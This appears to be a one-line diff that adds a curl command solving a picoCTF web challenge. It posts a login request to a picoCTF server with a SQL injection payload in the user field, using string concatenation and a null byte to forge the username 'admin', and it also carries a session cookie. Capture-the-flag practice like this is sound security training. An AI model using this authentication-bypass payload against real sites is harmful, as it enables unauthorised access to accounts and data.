@@ -1,0 +1,1 @@
+curl 'http://mercury.picoctf.net:26215/index.php' -H 'Cookie: name=28; PHPSESSID=ge0vtpgfvmc6e4ei9jp3r74h0i'   --data-raw 'user=ad%27||%27min%27%00&pass=pass'   --compressed   --insecure --output sql.txt;
